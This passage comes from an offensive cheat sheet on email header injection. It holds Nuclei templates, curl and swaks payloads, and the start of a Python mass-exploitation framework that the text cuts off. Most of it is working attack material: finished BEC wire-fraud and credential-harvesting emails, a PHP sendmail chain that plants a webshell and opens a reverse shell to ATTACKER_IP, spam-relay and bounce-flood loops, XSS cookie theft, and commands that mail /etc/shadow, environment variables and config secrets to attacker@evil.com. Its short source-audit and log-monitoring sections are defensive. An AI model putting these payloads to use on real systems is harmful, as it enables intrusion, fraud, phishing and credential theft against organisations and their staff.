# ---- NTLM info disclosure ----
nmap --script smtp-ntlm-info -p 25,465,587 target.com

# ---- STARTTLS capability ----
nmap --script smtp-commands -p 587 target.com | grep -i starttls

# ---- Brute force SMTP auth ----
nmap --script smtp-brute -p 25,465,587 target.com
nmap --script smtp-brute --script-args userdb=users.txt,passdb=passwords.txt -p 587 target.com

# ---- Combined comprehensive scan ----
nmap -sV -sC --script="smtp-*,ssl-*" -p 25,465,587,2525 target.com -oA smtp_comprehensive -v
```

::

---

## Nuclei Template Collection

::code-tree{default-value="email-header-bcc.yaml"}

```yaml [email-header-bcc.yaml]
id: email-header-injection-bcc

info:
  name: Email Header Injection - Bcc
  author: pentester
  severity: high
  tags: email,smtp,header-injection,crlf

http:
  - method: POST
    path:
      - "{{BaseURL}}/contact"
      - "{{BaseURL}}/feedback"
      - "{{BaseURL}}/subscribe"
      - "{{BaseURL}}/api/contact"
      - "{{BaseURL}}/api/send"
      - "{{BaseURL}}/api/email"

    body: "email=test@test.com%0d%0aBcc:{{interactsh-url}}&subject=test&message=test"
    headers:
      Content-Type: application/x-www-form-urlencoded

    matchers-condition: or
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "smtp"
          - "dns"

      - type: status
        status:
          - 200
          - 302
```

```yaml [email-header-cc.yaml]
id: email-header-injection-cc

info:
  name: Email Header Injection - Cc
  author: pentester
  severity: high
  tags: email,smtp,header-injection,crlf

http:
  - method: POST
    path:
      - "{{BaseURL}}/contact"
      - "{{BaseURL}}/feedback"

    body: "email=test@test.com%0d%0aCc:{{interactsh-url}}&subject=test&message=test"
    headers:
      Content-Type: application/x-www-form-urlencoded

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "smtp"
```

```yaml [email-header-subject.yaml]
id: email-header-injection-subject

info:
  name: Email Header Injection via Subject
  author: pentester
  severity: high
  tags: email,smtp,header-injection

http:
  - method: POST
    path:
      - "{{BaseURL}}/contact"
      - "{{BaseURL}}/feedback"

    body: "email=test@test.com&subject=test%0d%0aBcc:{{interactsh-url}}&message=test"
    headers:
      Content-Type: application/x-www-form-urlencoded

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "smtp"
```

```yaml [email-header-json.yaml]
id: email-header-injection-json

info:
  name: Email Header Injection - JSON API
  author: pentester
  severity: high
  tags: email,smtp,header-injection,api

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/contact"
      - "{{BaseURL}}/api/email"
      - "{{BaseURL}}/api/send"
      - "{{BaseURL}}/api/feedback"

    body: '{"email":"test@test.com\r\nBcc:{{interactsh-url}}","subject":"test","message":"test"}'
    headers:
      Content-Type: application/json

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "smtp"
          - "dns"
```

```yaml [email-header-double-encode.yaml]
id: email-header-injection-double-encode

info:
  name: Email Header Injection - Double Encoded
  author: pentester
  severity: high
  tags: email,smtp,header-injection,bypass

http:
  - method: POST
    path:
      - "{{BaseURL}}/contact"
      - "{{BaseURL}}/feedback"

    body: "email=test@test.com%250d%250aBcc:{{interactsh-url}}&subject=test&message=test"
    headers:
      Content-Type: application/x-www-form-urlencoded

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "smtp"
```

```yaml [email-header-name-field.yaml]
id: email-header-injection-name

info:
  name: Email Header Injection via Name Field
  author: pentester
  severity: high
  tags: email,smtp,header-injection

http:
  - method: POST
    path:
      - "{{BaseURL}}/contact"
      - "{{BaseURL}}/feedback"

    body: "email=test@test.com&name=User%0d%0aBcc:{{interactsh-url}}&subject=test&message=test"
    headers:
      Content-Type: application/x-www-form-urlencoded

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "smtp"
```

::

```bash
# ---- Run nuclei templates ----

# Single template
nuclei -u http://target.com -t email-header-bcc.yaml -v

# All email injection templates
nuclei -u http://target.com -t email-header-*.yaml -v

# Multiple targets
nuclei -l targets.txt -t email-header-*.yaml -o results.txt -v

# With custom interactsh server
nuclei -u http://target.com -t email-header-bcc.yaml -iserver oast.fun -v

# With rate limiting
nuclei -u http://target.com -t email-header-*.yaml -rl 10 -c 3 -v

# Output in JSON
nuclei -u http://target.com -t email-header-*.yaml -j -o results.json
```

---

## Attack Chaining Scenarios

::steps{level="4"}

#### Reconnaissance — Discover Email Functionality

```bash
# Crawl for contact/email forms
gospider -s http://target.com -d 3 -c 10 --other-source | \
  grep -iE "(contact|email|mail|feedback|subscribe|invite|share|report|notify)"

# Discover email-related parameters
paramspider -d target.com 2>/dev/null | \
  grep -iE "(email|mail|from|to|subject|sender|reply|cc|bcc|recipient)"

# Crawl with hakrawler
echo "http://target.com" | hakrawler -d 3 -plain | \
  grep -iE "(contact|email|mail|subscribe|feedback|report|invite|share)"

# API endpoint discovery
ffuf -u http://target.com/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt \
  -mc 200,405,401 \
  -t 20 | grep -iE "(mail|email|contact|send|notify|message)"

# JavaScript file analysis for email endpoints
echo "http://target.com" | katana -d 3 -jc -o /tmp/katana_output.txt
grep -iE "(mail|email|smtp|contact|send)" /tmp/katana_output.txt

# Check robots.txt and sitemap for hidden email forms
curl -s http://target.com/robots.txt | grep -i "contact\|mail\|email"
curl -s http://target.com/sitemap.xml | grep -i "contact\|mail\|email"
```

#### Parameter Analysis — Identify Injectable Fields

```bash
# Capture and analyze form fields
curl -s http://target.com/contact | grep -oP 'name="[^"]*"' | sort -u

# Test each field for reflection in response
for field in email name subject from sender reply_to; do
  MARKER="HEADERINJECT$(date +%s)"
  RESP=$(curl -s -X POST http://target.com/contact \
    -d "${field}=${MARKER}" \
    -d "message=test")
  if echo "$RESP" | grep -q "$MARKER"; then
    echo "[REFLECTED] Field: $field"
  else
    echo "[NOT-REFLECTED] Field: $field"
  fi
done

# Check for WAF presence
curl -s -o /dev/null -w "%{http_code}" -X POST http://target.com/contact \
  -d "email=test@test.com%0d%0aBcc:test@test.com" \
  -d "message=test"
# 200/302 = likely no WAF blocking | 403/406 = WAF detected
```

#### Injection Probing — Test for Vulnerability

```bash
# Start OOB listener
interactsh-client -v &
INTERACT_URL="GENERATED_URL_HERE"

# Probe each field with unique identifiers
FIELDS=("email" "name" "subject" "from" "sender" "reply_to")
for field in "${FIELDS[@]}"; do
  PROBE_ID=$(uuidgen | cut -d- -f1)
  echo "[*] Probing field: $field (ID: $PROBE_ID)"

  curl -s -X POST http://target.com/contact \
    -d "${field}=test%0d%0aBcc:${PROBE_ID}.${INTERACT_URL}" \
    -d "message=probe-${field}-${PROBE_ID}"

  sleep 1
done

echo "[*] Check interactsh output for SMTP/DNS interactions"
echo "[*] Match PROBE_ID to identify which field is injectable"
```

#### Confirmation — Verify Exploitability

```bash
# Confirmed injectable field: email
# Test escalation from Bcc to full control

# Test 1: Can we add Cc?
curl -s -X POST http://target.com/contact \
  -d "email=test@test.com%0d%0aCc:confirm1.${INTERACT_URL}" \
  -d "subject=Test" -d "message=Cc test"

# Test 2: Can we override Subject?
curl -s -X POST http://target.com/contact \
  -d "email=test@test.com%0d%0aSubject:OVERRIDDEN" \
  -d "subject=Original" -d "message=Subject test"

# Test 3: Can we override From?
curl -s -X POST http://target.com/contact \
  -d "email=test@test.com%0d%0aFrom:spoofed@target.com" \
  -d "subject=Test" -d "message=From test"

# Test 4: Can we inject body?
curl -s -X POST http://target.com/contact \
  -d "email=test@test.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>BODY INJECTED</h1>" \
  -d "subject=Test" -d "message=Body test"

# Test 5: Can we reach RCE (PHP only)?
curl -s -X POST http://target.com/contact.php \
  -d "email=x]@test.com -X/tmp/rce_test.txt" \
  -d "subject=RCE_PROBE" -d "message=test"
```

#### Weaponization — Full Exploitation

```bash
# ---- Scenario A: Mass BEC phishing ----
curl -X POST http://target.com/contact \
  -d "email=cfo@target.com%0d%0aBcc:finance1@target.com,finance2@target.com,finance3@target.com%0d%0aFrom:cfo@target.com%0d%0aSubject:Urgent Wire Transfer - CONFIDENTIAL%0d%0aContent-Type:text/html%0d%0aX-Priority:1%0d%0aImportance:High%0d%0a%0d%0a<html><body style='font-family:Calibri'><p>Team,</p><p>Please process an urgent wire transfer:</p><ul><li>Amount: \$85,000</li><li>Bank: International Bank Corp</li><li>Account: 9876543210</li><li>Reference: INV-2025-001</li></ul><p>This is time-sensitive. Complete before EOD.</p><p>Regards,<br><strong>CFO Name</strong><br>Chief Financial Officer</p></body></html>" \
  -d "subject=x" -d "message=x"

# ---- Scenario B: Credential harvesting ----
curl -X POST http://target.com/contact \
  -d "email=it-helpdesk@target.com%0d%0aBcc:allstaff@target.com%0d%0aSubject:Email Migration - Action Required%0d%0aContent-Type:text/html%0d%0a%0d%0a<html><body style='font-family:Arial;max-width:600px;margin:auto'><div style='background:%23f5f5f5;padding:20px;border-radius:8px'><img src='https://target.com/logo.png' width='180'><h2>Email System Migration</h2><p>We are upgrading our email infrastructure. Please re-authenticate to prevent service disruption.</p><form action='http://evil.com/harvest' method='POST'><input type='email' name='email' placeholder='Corporate Email' style='width:100%%;padding:12px;margin:8px 0;border:1px solid %23ddd;border-radius:4px'><input type='password' name='password' placeholder='Password' style='width:100%%;padding:12px;margin:8px 0;border:1px solid %23ddd;border-radius:4px'><button style='width:100%%;padding:12px;background:%230066cc;color:white;border:none;border-radius:4px;cursor:pointer;font-size:16px'>Authenticate</button></form><p style='font-size:12px;color:%23999'>This link expires in 24 hours.</p></div></body></html>" \
  -d "subject=x" -d "message=x"

# ---- Scenario C: PHP RCE chain ----
# Step 1: Write webshell
curl -X POST http://target.com/contact.php \
  -d "email=x]@evil.com -OQueueDirectory=/tmp -X/var/www/html/.sys.php" \
  -d "subject=<?php if(isset(\$_REQUEST['c'])){system(\$_REQUEST['c']);} ?>" \
  -d "message=test"

# Step 2: Verify webshell
curl -s "http://target.com/.sys.php?c=id"

# Step 3: Establish reverse shell
curl -s "http://target.com/.sys.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```

::

---

## Advanced Exploitation Scenarios

::tabs
  :::tabs-item{icon="i-lucide-fish" label="Spear Phishing Campaigns"}

  ```bash
  # ---- Internal impersonation phishing ----

  # CEO impersonation to HR
  curl -X POST http://target.com/contact \
    -d "email=ceo@target.com%0d%0aTo:hr-director@target.com%0d%0aSubject:Confidential - Employee Termination%0d%0aContent-Type:text/html%0d%0aX-Priority:1%0d%0a%0d%0a<html><body style='font-family:Calibri'><p>Please prepare termination paperwork for the following employee. Do not discuss with anyone until completed.</p><p><a href='http://evil.com/document' style='color:%230066cc'>View Confidential Document</a></p><p>CEO Name</p></body></html>" \
    -d "subject=x" -d "message=x"

  # IT department impersonation
  curl -X POST http://target.com/contact \
    -d "email=sysadmin@target.com%0d%0aBcc:developers@target.com%0d%0aSubject:VPN Certificate Renewal Required%0d%0aContent-Type:text/html%0d%0a%0d%0a<html><body><h3>VPN Certificate Expiring</h3><p>Your VPN certificate expires today. Download the renewed certificate:</p><a href='http://evil.com/vpn-cert.exe'>Download Certificate</a><p>System Administration</p></body></html>" \
    -d "subject=x" -d "message=x"

  # Vendor impersonation
  curl -X POST http://target.com/contact \
    -d "email=billing@vendor-partner.com%0d%0aTo:accounts-payable@target.com%0d%0aSubject:Updated Banking Details - Invoice %2312847%0d%0aContent-Type:text/html%0d%0a%0d%0a<html><body><p>Dear Accounts Payable,</p><p>Please update our banking details for future payments:</p><ul><li>Bank: Attacker Bank</li><li>Account: 1111222233334444</li><li>Routing: 021000089</li></ul><p>Best regards,<br>Vendor Name</p></body></html>" \
    -d "subject=x" -d "message=x"

  # Calendar invite injection
  curl -X POST http://target.com/contact \
    -d "email=admin@target.com%0d%0aBcc:victim@target.com%0d%0aContent-Type:text/calendar;method=REQUEST%0d%0a%0d%0aBEGIN:VCALENDAR%0d%0aVERSION:2.0%0d%0aMETHOD:REQUEST%0d%0aBEGIN:VEVENT%0d%0aSUMMARY:Board Meeting - Mandatory%0d%0aDTSTART:20250115T100000Z%0d%0aDTEND:20250115T110000Z%0d%0aLOCATION:http://evil.com/meeting%0d%0aEND:VEVENT%0d%0aEND:VCALENDAR" \
    -d "subject=x" -d "message=x"
  ```

  :::

  :::tabs-item{icon="i-lucide-server" label="Spam Relay & Domain Abuse"}

  ```bash
  # ---- Abuse target as spam relay ----

  # Generate recipient list
  seq 1 500 | xargs -I{} echo "user{}@victim-domain.com" > /tmp/spam_targets.txt

  # Mass relay
  while IFS= read -r recipient; do
    curl -s -X POST http://target.com/contact \
      -d "email=promo@target.com%0d%0aTo:${recipient}%0d%0aSubject:Exclusive Offer%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>Congratulations!</h1><a href='http://evil.com/claim'>Claim Your Prize</a>" \
      -d "subject=x" -d "message=x" &

    # Rate limit to avoid detection
    if (( RANDOM % 5 == 0 )); then sleep 1; fi
  done < /tmp/spam_targets.txt
  wait

  # ---- Domain reputation damage ----

  # Send spam that triggers blocklist reporting
  swaks --to abuse@spamcop.net \
    --from spam-king@target.com \
    --server target.com:25 \
    --header "Subject: Buy Cheap Products" \
    --body "SPAM CONTENT - http://spam-site.com"

  # Send to spam trap addresses
  swaks --to spamtrap@spamhaus.org \
    --from marketing@target.com \
    --server target.com:25 \
    --body "Unsolicited commercial email"

  # ---- Bounce flood (Joe Job) ----
  # Send emails to non-existent addresses with target as From
  for i in $(seq 1 100); do
    swaks --to "nonexistent${i}@random-domain.com" \
      --from "admin@target.com" \
      --server target.com:25 \
      --body "Test" &
  done
  wait
  # Bounces flood target.com inbox
  ```

  :::

  :::tabs-item{icon="i-lucide-link" label="XSS via Email Body"}

  ```bash
  # ---- Cross-Site Scripting in webmail/HTML email viewers ----

  # JavaScript execution in webmail
  curl -X POST http://target.com/contact \
    -d "email=test@test.com%0d%0aBcc:victim@target.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<html><body><script>new Image().src='http://evil.com/steal?cookie='+document.cookie</script></body></html>" \
    -d "subject=Notice" -d "message=x"

  # SVG-based XSS
  curl -X POST http://target.com/contact \
    -d "email=test@test.com%0d%0aBcc:victim@target.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<svg/onload=fetch('http://evil.com/x?d='+document.domain)>" \
    -d "subject=Notice" -d "message=x"

  # CSS data exfiltration
  curl -X POST http://target.com/contact \
    -d "email=test@test.com%0d%0aBcc:victim@target.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<html><head><style>@import url('http://evil.com/css-exfil');</style></head><body>Content</body></html>" \
    -d "subject=Notice" -d "message=x"

  # Meta refresh redirect
  curl -X POST http://target.com/contact \
    -d "email=test@test.com%0d%0aBcc:victim@target.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<html><head><meta http-equiv='refresh' content='0;url=http://evil.com/phish'></head><body>Loading...</body></html>" \
    -d "subject=Update" -d "message=x"

  # Form action hijack in email
  curl -X POST http://target.com/contact \
    -d "email=test@test.com%0d%0aBcc:victim@target.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<html><body><p>Please verify your identity:</p><form action='http://evil.com/steal' method='POST'><input name='user' placeholder='Username'><input name='pass' type='password' placeholder='Password'><button>Submit</button></form></body></html>" \
    -d "subject=Verify" -d "message=x"

  # Image tracking pixel with unique identifier
  curl -X POST http://target.com/contact \
    -d "email=test@test.com%0d%0aBcc:victim@target.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<html><body>Important message.<img src='http://evil.com/pixel.gif?target=victim@target.com&ts=$(date +%s)' width='1' height='1' style='display:none'></body></html>" \
    -d "subject=Important" -d "message=x"
  ```

  :::

  :::tabs-item{icon="i-lucide-shield" label="SPF/DKIM/DMARC Abuse"}

  ```bash
  # ---- Leverage trusted domain for email authentication bypass ----

  # When injecting through target's mail server, emails pass:
  # - SPF: Sent from authorized IP (target's server)
  # - DKIM: May be signed by target's domain keys
  # - DMARC: Passes alignment checks

  # Verify SPF record
  dig TXT target.com | grep spf
  nslookup -type=TXT target.com | grep spf

  # Verify DKIM selector
  dig TXT default._domainkey.target.com
  dig TXT selector1._domainkey.target.com
  dig TXT google._domainkey.target.com

  # Verify DMARC policy
  dig TXT _dmarc.target.com

  # Check if DMARC is p=none (allows spoofing)
  dig TXT _dmarc.target.com | grep "p=none"
  # p=none → emails pass even with failed alignment
  # p=quarantine → may go to spam
  # p=reject → blocked

  # Test delivery with authentication analysis
  swaks --to external-test@gmail.com \
    --from admin@target.com \
    --server target.com:25 \
    --header "Subject: SPF/DKIM Test" \
    --body "Check email headers for authentication results"
  # Then examine received email headers for:
  # Authentication-Results: spf=pass dkim=pass dmarc=pass

  # If all pass → phishing emails from target.com will
  # bypass most email security gateways
  ```

  :::

  :::tabs-item{icon="i-lucide-database" label="Data Exfiltration via Email"}

  ```bash
  # ---- Exfil data via injected email to attacker ----

  # If you have limited RCE or file read, exfil via email

  # Exfil /etc/passwd via PHP mail injection
  curl -X POST http://target.com/contact.php \
    -d "email=x]@evil.com -X/tmp/exfil.txt" \
    -d "subject=$(curl -s http://target.com/contact.php?page=../../../etc/passwd | head -20)" \
    -d "message=test"

  # Exfil via swaks (if you have SMTP access)
  cat /etc/passwd | swaks --to attacker@evil.com \
    --from data@target.com \
    --server target.com:25 \
    --header "Subject: Exfil - passwd" \
    --body -

  # Exfil environment variables
  swaks --to attacker@evil.com \
    --from data@target.com \
    --server target.com:25 \
    --header "Subject: Exfil - env" \
    --body "$(env 2>/dev/null)"

  # Exfil database credentials from config files
  swaks --to attacker@evil.com \
    --from data@target.com \
    --server target.com:25 \
    --header "Subject: Exfil - db config" \
    --body "$(cat /var/www/html/config.php 2>/dev/null || cat /var/www/html/.env 2>/dev/null)"

  # Exfil with attachment
  swaks --to attacker@evil.com \
    --from data@target.com \
    --server target.com:25 \
    --attach /etc/shadow \
    --body "Shadow file attached"
  ```

  :::
::

---

## Source Code Audit Patterns

::tip
When you have access to source code during a pentest engagement, search for these vulnerable patterns to identify injection points quickly.
::

::code-group

```bash [PHP Patterns]
# Find mail() calls with user input
grep -rn "mail(" --include="*.php" . | grep -v "vendor/"

# Find user input in mail headers
grep -rn '\$_\(POST\|GET\|REQUEST\).*mail\|mail.*\$_\(POST\|GET\|REQUEST\)' --include="*.php" .

# Find string concatenation in headers
grep -rn "headers.*\\.=.*\\\$_" --include="*.php" .
grep -rn "From:.*\\\$_" --include="*.php" .

# Find 5th parameter usage (RCE risk)
grep -Prn "mail\s*\([^)]+,[^)]+,[^)]+,[^)]+,[^)]+\)" --include="*.php" .

# Find PHPMailer usage
grep -rn "PHPMailer\|addAddress\|setFrom\|addReplyTo" --include="*.php" .

# Find SwiftMailer usage
grep -rn "Swift_Message\|Swift_Mailer" --include="*.php" .

# Check for sanitization (absence = vulnerable)
grep -rn "filter_var.*FILTER_VALIDATE_EMAIL\|filter_input\|htmlspecialchars\|preg_replace.*0x\|str_replace.*\\\\r\|str_replace.*\\\\n" --include="*.php" .
```

```bash [Python Patterns]
# Find smtplib usage
grep -rn "smtplib\|SMTP\|send_message\|sendmail" --include="*.py" .

# Find Django email
grep -rn "send_mail\|EmailMessage\|EmailMultiAlternatives" --include="*.py" .

# Find Flask-Mail
grep -rn "flask_mail\|Message(\|mail.send" --include="*.py" .

# Find user input in email fields
grep -rn "request\.\(form\|json\|args\|data\).*\(email\|from\|subject\|sender\)" --include="*.py" .

# Check for input validation
grep -rn "validate_email\|email_validator\|re\.match.*@\|sanitize" --include="*.py" .
```

```bash [Node.js Patterns]
# Find Nodemailer usage
grep -rn "nodemailer\|createTransport\|sendMail\|transporter" --include="*.js" --include="*.ts" .

# Find user input in mail options
grep -rn "req\.body.*\(from\|email\|subject\|sender\)" --include="*.js" --include="*.ts" .

# Find string concatenation in email
grep -rn "from.*req\.\|subject.*req\.\|replyTo.*req\." --include="*.js" --include="*.ts" .

# Check for validation
grep -rn "validator\|sanitize\|escape\|isEmail\|joi.*email" --include="*.js" --include="*.ts" .
```

```bash [Ruby Patterns]
# Find ActionMailer
grep -rn "ActionMailer\|ApplicationMailer\|deliver\|mail(" --include="*.rb" .

# Find Net::SMTP
grep -rn "Net::SMTP\|smtp\.send_message" --include="*.rb" .

# Find user input in mailer
grep -rn "params\[.*email\|params\[.*from\|params\[.*subject" --include="*.rb" .

# Check for sanitization
grep -rn "sanitize\|gsub.*\\\\r\|gsub.*\\\\n\|strip\|validates.*email" --include="*.rb" .
```

```bash [Java Patterns]
# Find JavaMail usage
grep -rn "SimpleMailMessage\|MimeMessage\|JavaMailSender\|Transport\.send" --include="*.java" .

# Find user input in mail
grep -rn "@RequestParam.*email\|@RequestParam.*subject\|@RequestBody.*email" --include="*.java" .

# Find string concatenation in headers
grep -rn "setFrom\|setSubject\|addRecipient" --include="*.java" . | grep -i "request\|param\|input"

# Check for validation
grep -rn "javax\.mail\.internet\.InternetAddress\|EmailValidator\|@Email\|@Valid" --include="*.java" .
```

```bash [Semgrep Rules]
# Run semgrep with pre-built rules
semgrep --config "p/php-header-injection" ./src/
semgrep --config "p/python-header-injection" ./src/
semgrep --config "p/crlf-injection" ./src/

# Custom semgrep rule for PHP mail injection
cat > /tmp/php_mail_inject.yaml << 'EOF'
rules:
  - id: php-mail-header-injection
    patterns:
      - pattern: mail($TO, $SUBJ, $MSG, ... . $_POST[$KEY] . ...)
    message: User input in mail() headers - Header Injection
    languages: [php]
    severity: ERROR
EOF
semgrep --config /tmp/php_mail_inject.yaml ./src/
```

::

---

## OOB Detection & Verification Methods

::accordion
  :::accordion-item{icon="i-lucide-radio" label="interactsh Setup & Usage"}

  ```bash
  # Install interactsh
  go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

  # Start client with verbose output
  interactsh-client -v -o /tmp/interactions.log

  # Note the generated URL (e.g., abc123xyz.oast.fun)
  # Use this as the Bcc/Cc/To target in injection payloads

  # Example injection using interactsh URL
  curl -X POST http://target.com/contact \
    -d "email=test@test.com%0d%0aBcc:abc123xyz.oast.fun" \
    -d "subject=Test" \
    -d "message=OOB test"

  # Monitor interactsh output for:
  # [smtp] Received SMTP interaction from X.X.X.X
  # [dns] Received DNS interaction (MX lookup)

  # Custom interactsh server
  interactsh-client -server custom.oast.server -v

  # With token authentication
  interactsh-client -server custom.oast.server -token YOUR_TOKEN -v

  # Filter SMTP only
  interactsh-client -v 2>&1 | grep "\[smtp\]"
  ```

  :::

  :::accordion-item{icon="i-lucide-terminal" label="Python SMTP Debugging Server"}

  ```bash
  # Start local SMTP debugging server (prints all received mail)
  sudo python3 -m smtpd -n -c DebuggingServer 0.0.0.0:25

  # Alternative: aiosmtpd (modern async version)
  pip3 install aiosmtpd
  python3 -m aiosmtpd -n -l 0.0.0.0:25

  # Custom SMTP listener that logs to file
  python3 << 'LISTENER'
  import asyncio
  from aiosmtpd.controller import Controller
  from aiosmtpd.handlers import Debugging
  import datetime

  class LogHandler:
      async def handle_DATA(self, server, session, envelope):
          timestamp = datetime.datetime.now().isoformat()
          print(f"\n{'='*60}")
          print(f"[{timestamp}] Email received")
          print(f"From: {envelope.mail_from}")
          print(f"To: {envelope.rcpt_tos}")
          print(f"Peer: {session.peer}")
          print(f"--- Headers & Body ---")
          print(envelope.content.decode('utf-8', errors='replace'))
          print(f"{'='*60}\n")

          with open('/tmp/smtp_captures.log', 'a') as f:
              f.write(f"\n[{timestamp}]\n")
              f.write(f"From: {envelope.mail_from}\n")
              f.write(f"To: {envelope.rcpt_tos}\n")
              f.write(envelope.content.decode('utf-8', errors='replace'))
              f.write(f"\n{'='*60}\n")

          return '250 OK'

  controller = Controller(LogHandler(), hostname='0.0.0.0', port=25)
  controller.start()
  print("[*] SMTP listener started on 0.0.0.0:25")
  print("[*] Logging to /tmp/smtp_captures.log")
  input("[*] Press Enter to stop...\n")
  controller.stop()
  LISTENER
  ```

  :::

  :::accordion-item{icon="i-lucide-network" label="Network-Level Monitoring"}

  ```bash
  # Monitor SMTP traffic with tcpdump
  sudo tcpdump -i any port 25 -A -n 2>&1 | grep -E "^(From|To|Bcc|Cc|Subject|RCPT|MAIL):"

  # Capture to pcap file
  sudo tcpdump -i eth0 -f "port 25 or port 587 or port 465" -w /tmp/smtp_capture.pcap -v

  # Analyze with tshark
  tshark -r /tmp/smtp_capture.pcap -Y smtp -T fields \
    -e ip.src -e ip.dst -e smtp.req.command -e smtp.req.parameter

  # Extract SMTP conversation
  tshark -r /tmp/smtp_capture.pcap -Y smtp -z "follow,tcp,ascii,0"

  # Monitor DNS for MX lookups (indicates mail delivery attempt)
  sudo tcpdump -i any port 53 -n 2>&1 | grep -i "MX\|evil.com\|attacker"

  # Monitor with ngrep for email content
  sudo ngrep -d any -W byline "Bcc|Cc|From|Subject" port 25
  ```

  :::

  :::accordion-item{icon="i-lucide-file-search" label="Mail Log Analysis"}

  ```bash
  # ---- Postfix logs ----
  tail -f /var/log/mail.log | grep -iE "(bcc|cc|relay|reject|injected)"
  grep -i "bcc:" /var/log/mail.log | grep -v "expected-address"
  grep -c "status=sent" /var/log/mail.log  # Count sent emails

  # ---- Sendmail logs ----
  tail -f /var/log/maillog | grep -iE "(bcc|cc|relay|reject)"

  # ---- Exim logs ----
  tail -f /var/log/exim4/mainlog | grep -iE "(bcc|cc|relay)"

  # ---- Check mail queue ----
  # Postfix
  postqueue -p
  mailq

  # Sendmail
  sendmail -bp

  # Exim
  exim -bp

  # ---- Parse received email headers ----
  formail -x Received -x From -x To -x Bcc -x Cc -x Subject -x Return-Path < email.eml

  # ---- Extract all email addresses from logs ----
  grep -ohE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" /var/log/mail.log | sort -u
  ```

  :::
::

---

## Response Analysis

::collapsible

| Indicator | Meaning | Next Step |
| --- | --- | --- |
| HTTP 200 + normal response body | Server processed payload normally | Check OOB listener for email delivery |
| HTTP 200 + "email sent" message | Email function executed | High confidence — verify via OOB |
| HTTP 302 redirect to success page | Form processed successfully | Check redirect destination + OOB |
| HTTP 200 + different response length | Payload may have altered processing | Compare with baseline response |
| HTTP 400 Bad Request | Input validation caught something | Try encoding bypass or alternate field |
| HTTP 403 Forbidden | WAF or access control blocked | Try alternate encoding or different field |
| HTTP 500 Internal Server Error | Server error from malformed input | Payload partially processed — try variations |
| SMTP interaction on OOB listener | Email delivered to injected address | **CONFIRMED VULNERABLE** |
| DNS MX lookup on OOB listener | Mail server attempted delivery | Injection worked, delivery may have failed |
| No response change, no OOB | Injection likely failed or sanitized | Try different newline variant or encoding |
| "Invalid email" error message | Email validation present | Inject in non-email fields (name/subject) |
| Response contains injected header text | Input reflected without execution | May be display-only, not in actual email |

::

---

## Comprehensive Payload Matrix

::collapsible

| Category | Payload | Target Header | Impact |
| --- | --- | --- | --- |
| Hidden recipient | `%0d%0aBcc:evil@atk.com` | Bcc | Silent email copy |
| Visible copy | `%0d%0aCc:evil@atk.com` | Cc | Visible copy recipient |
| Extra recipient | `%0d%0aTo:evil@atk.com` | To | Additional delivery |
| Reply redirect | `%0d%0aReply-To:evil@atk.com` | Reply-To | Capture responses |
| Sender spoof | `%0d%0aFrom:ceo@target.com` | From | Impersonation |
| Subject override | `%0d%0aSubject:Urgent Alert` | Subject | Social engineering |
| Body inject (text) | `%0d%0a%0d%0aInjected body` | Body | Content override |
| Body inject (HTML) | `%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>X</h1>` | Content-Type + Body | Rich content injection |
| High priority | `%0d%0aX-Priority:1%0d%0aImportance:High` | X-Priority | Urgency flag |
| Read receipt | `%0d%0aDisposition-Notification-To:evil@atk.com` | DNT | Open tracking |
| Bounce redirect | `%0d%0aReturn-Path:<evil@atk.com>` | Return-Path | Bounce capture |
| Thread hijack | `%0d%0aIn-Reply-To:<msgid@target.com>` | In-Reply-To | Conversation insertion |
| Mailer spoof | `%0d%0aX-Mailer:Outlook 16.0` | X-Mailer | Client impersonation |
| MIME attachment | `%0d%0aContent-Type:multipart/mixed;boundary=X` | Content-Type | Attachment injection |
| List-Unsubscribe | `%0d%0aList-Unsubscribe:<http://evil.com>` | List-Unsubscribe | Malicious unsubscribe link |
| LF bypass | `%0aBcc:evil@atk.com` | Bcc | Unix-style bypass |
| CR bypass | `%0dBcc:evil@atk.com` | Bcc | Legacy bypass |
| Double encode | `%250d%250aBcc:evil@atk.com` | Bcc | Filter bypass |
| UTF-8 overlong | `%C0%8D%C0%8ABcc:evil@atk.com` | Bcc | Encoding bypass |
| Unicode NEL | `%C2%85Bcc:evil@atk.com` | Bcc | Unicode bypass |
| Unicode LS | `%E2%80%A8Bcc:evil@atk.com` | Bcc | Unicode bypass |
| Null prefix | `%00%0d%0aBcc:evil@atk.com` | Bcc | Null byte bypass |
| Fold space | `%0d%0a%20Bcc:evil@atk.com` | Bcc | RFC folding bypass |
| Fold tab | `%0d%0a%09Bcc:evil@atk.com` | Bcc | RFC folding bypass |
| PHP RCE | `x]@evil.com -X/var/www/html/sh.php` | sendmail -X | Remote code execution |
| PHP config read | `x]@evil.com -C/etc/passwd -X/tmp/out` | sendmail -C | File read |

::

---

## Mass Exploitation Automation

::code-collapse

```python
#!/usr/bin/env python3
"""
Email Header Injection Mass Exploitation Framework
Supports: form-encoded, JSON, multipart
Features: multi-field, multi-payload, OOB verification, rate limiting
"""

import requests
import time
import uuid
import sys
import json
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

class EmailInjectionExploit:
    def __init__(self, targets_file, callback_domain, threads=5, delay=1):
        self.targets = self.load_targets(targets_file)
        self.callback = callback_domain
        self.threads = threads
        self.delay = delay
        self.results = []
        self.lock = threading.Lock()

    def load_targets(self, filepath):
        with open(filepath) as f:
            return [line.strip() for line in f if line.strip()]

    def generate_payloads(self, tracking_id):
        cb = f"{tracking_id}.{self.callback}"
        return {
